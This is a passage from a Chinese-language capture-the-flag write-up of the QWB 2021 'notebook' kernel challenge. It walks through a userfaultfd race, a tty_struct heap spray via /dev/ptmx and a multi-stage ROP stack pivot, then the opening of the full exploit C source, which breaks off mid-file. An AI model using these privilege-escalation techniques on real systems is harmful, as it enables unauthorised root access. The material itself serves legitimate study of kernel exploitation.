filled.\n\033[m&quot;</span>);</span><br><span class="line">    notebook_msg();</span><br><span class="line"></span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x2000</span>, mmap_space);        <span class="comment">// trigger page fault</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中最后一条语句就能够触发缺页异常。<br><img src="https://img-blog.csdnimg.cn/20b28fe578504a59a5f478c8e81a1660.png"><br>可以看到确实成功了。</p><h1 id="Step-13-exp编写——另开线程进行恶意写入"><a href="#Step-13-exp编写——另开线程进行恶意写入" class="headerlink" title="Step 13: exp编写——另开线程进行恶意写入"></a>Step 13: exp编写——另开线程进行恶意写入</h1><p>需要注意的是，在read和write函数均有_check_object_size函数调用，用于检查内存块的大小。这里是为了检查note的真实大小是否等于size。为了绕过这个检查，我们除了需要使用noteedit函数外，还需要使用noteadd函数将size改小一些。</p><p>修改之前：<br><img src="https://img-blog.csdnimg.cn/fb373e9c2d64495db893b4482b1fc56f.png"><br>修改之后：<br><img src="https://img-blog.csdnimg.cn/69193e61231c4b2f8ba0142a34d2e92b.png"></p><h1 id="Step-14-exp编写——重复打开-x2F-dev-x2F-ptmx，获取tty-struct地址"><a href="#Step-14-exp编写——重复打开-x2F-dev-x2F-ptmx，获取tty-struct地址" class="headerlink" title="Step 14: exp编写——重复打开&#x2F;dev&#x2F;ptmx，获取tty_struct地址"></a>Step 14: exp编写——重复打开&#x2F;dev&#x2F;ptmx，获取tty_struct地址</h1><p>在我们阻塞了一些线程之后，打开&#x2F;dev&#x2F;ptmx文件，tty_struct就有可能分配到note的地址中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x60</span>; i++)</span><br><span class="line">        ptmx_fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mHeap sprayed by lots of tty_struct by opening /dev/ptmx\n\033[m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;add_thread, <span class="literal">NULL</span>, noteadd_exp, (<span class="type">void</span>*)i);</span><br><span class="line">    notebook_msg(<span class="literal">true</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    for(int i=0; i&lt;0x10; i++)</span></span><br><span class="line"><span class="comment">//        sem_post(&amp;add_sem);</span></span><br><span class="line"><span class="comment">//    sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ttyinfo[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">memset</span>(ttyinfo, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">    <span class="type">char</span>* hit_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> hit_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span>* fake_ttyops_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_ttyops_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">size_t</span>* fake_stack_address = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> fake_stack_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)&#123;</span><br><span class="line">        read(fd, ttyinfo, i);</span><br><span class="line">        <span class="type">int</span> header = *((<span class="type">int</span>*)ttyinfo);</span><br><span class="line">        <span class="keyword">if</span>(header == <span class="number">0x5401</span> || header ==  <span class="number">0x5402</span>)&#123;</span><br><span class="line">            hit_address = notebook_msg(<span class="literal">false</span>)[i].note;</span><br><span class="line">            hit_idx = i;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_ttyops_idx == <span class="number">-1</span>)&#123;</span><br><span class="line">                fake_ttyops_address = (<span class="type">char</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_ttyops_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                fake_stack_address = (<span class="type">size_t</span>*)(notebook_msg(<span class="literal">false</span>)[i].note);</span><br><span class="line">                fake_stack_idx = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(hit_address &amp;&amp; fake_stack_address)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里重复打开之后，遍历所有的note，检查其magic魔数以判断是否是tty_struct结构体。对于不是tty_struct结构体的note，我们选择两个出来作为假的tty_operations和假的栈空间，准备用于栈迁移。</p><h1 id="Step-15-exp编写——构造ROP链"><a href="#Step-15-exp编写——构造ROP链" class="headerlink" title="Step 15: exp编写——构造ROP链"></a>Step 15: exp编写——构造ROP链</h1><p>在调用&#x2F;dev&#x2F;ptmx的write函数时，rdi指向tty_struct结构体本身，因此可以利用这种性质获取到tty_struct结构体的地址，并将rsp赋值为这个地址。我们需要找的是能够将rdi中的内容拷贝到rsp中的gadget。正好有这个gadget：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/pwnfile/QWB/QWB-2021/notebook/附件# cat gadgets.txt | grep &#x27;push rdi ; pop rsp&#x27;</span><br><span class="line">0xffffffff812351be : push rdi ; pop rsp ; jmp 0xffffffff8123519f</span><br><span class="line">0xffffffff81238d50 : push rdi ; pop rsp ; pop rbp ; add rax, rdx ; ret</span><br><span class="line">0xffffffff8143f4e1 : push rdi ; pop rsp ; pop rbp ; or eax, edx ; ret</span><br></pre></td></tr></table></figure><p>这样我们就可以第一次栈迁移到tty_struct。</p><p>然后，我们在tty_struct中再构造一个简短的gadget。因为tty_struct对于&#x2F;dev&#x2F;ptmx文件操作至关重要，对于其中的字段我们能修改地越少越好。因此我们还需要第二次栈迁移。这第二次栈迁移我们选择迁移到假的tty_operations中，这个tty_operations也就是进行第一次栈迁移时使用的假的tty_operations，其中写有构造好的write函数，也就是用于第一次栈迁移到tty_struct的gadget。</p><p>这里我们使用下面的gadget来进行构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81002141 : pop rbx ; pop rbp ; ret</span><br><span class="line">0xffffffff8107875c : mov rsp, rbp ; pop rbp ; ret</span><br></pre></td></tr></table></figure><p>我们在tty_struct[1]的位置写入第一个gadget，这样可以将假tty_operations（位于tty_struct[3]）地址拷贝到rbp中，然后在tty_struct[4]写入第二个gadget栈迁移到假tty_operations中。</p><p>由于tty_operations中需要有write函数指针指向第一次栈迁移gadget，为了避免覆盖，我们进行第三次栈迁移（或者使用诸如<code>add rsp, 0x10</code>这样的指令跳过）。</p><p>然后在第三次栈迁移后，我们终于可以相对自由地构造自己的rop链了。接下来就是常规的构造内核rop链过程：执行commit_creds(prepare_kernel_cred(NULL))、返回到用户态。注意这里含的<code>mov rdi, rax</code>的gadget不好找，在ROPgadget中没有这种gadget，但是通过objdump还是可以找到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ffffffff81045833:48 89 c7             mov    %rax,%rdi</span><br><span class="line">ffffffff81045836:31 c0                xor    %eax,%eax</span><br><span class="line">ffffffff81045838:48 81 ff 00 00 00 09 cmp    $0x9000000,%rdi</span><br><span class="line">ffffffff8104583f:74 02                je     ffffffff81045843 &lt;lmce_supported+0x33&gt;</span><br><span class="line">ffffffff81045841:5d                   pop    %rbp</span><br><span class="line">ffffffff81045842:c3                   retq</span><br></pre></td></tr></table></figure><p>另外在swapgs_restore_regs_and_return_to_usermode函数中，前面的一大堆pop我们不需要，因此可以直接跳过。</p><p><img src="https://img-blog.csdnimg.cn/1965b5316f814b609d992284de8de92f.png"></p><p><img src="https://img-blog.csdnimg.cn/c0f4594bb21e4d34a5411c6d7aaa5589.png"></p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termiox</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">                                  <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">                  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                  <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                         <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                    <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                      <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line"><span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line"><span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_CODE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GIFT_CODE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_CODE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_CODE 768</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ptm_unix98_ops 0xFFFFFFFF81E8E440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pty_unix98_ops 0xFFFFFFFF81E8E320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> commit_creds_BASE 0xFFFFFFFF810A9B40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prepare_kernel_cred_BASE 0xFFFFFFFF810A9EF0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kernel_BASE 0xFFFFFFFF81000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81A00929</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> add_thread, edit_thread;</span><br><span class="line"><span class="type">char</span>* mmap_space;</span><br><span class="line"><span class="type">sem_t</span> add_sem, edit_sem;</span><br><span class="line"><span class="type">int</span> ptmx_fds[<span class="number">0x60</span>];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">notearg</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span>* buf;</span><br><span class="line">&#125;notearg;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* note;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;note;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>;</span><br><span class="line">note* <span class="title function_">notebook_msg</span><span class="params">(<span class="type">bool</span> printInfo)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteedit_exp</span><span class="params">(<span class="type">void</span>* args)</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">noteadd_exp</span><span class="params">(<span class="type">void</span>* args)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>;</span><br><span class="line"><span 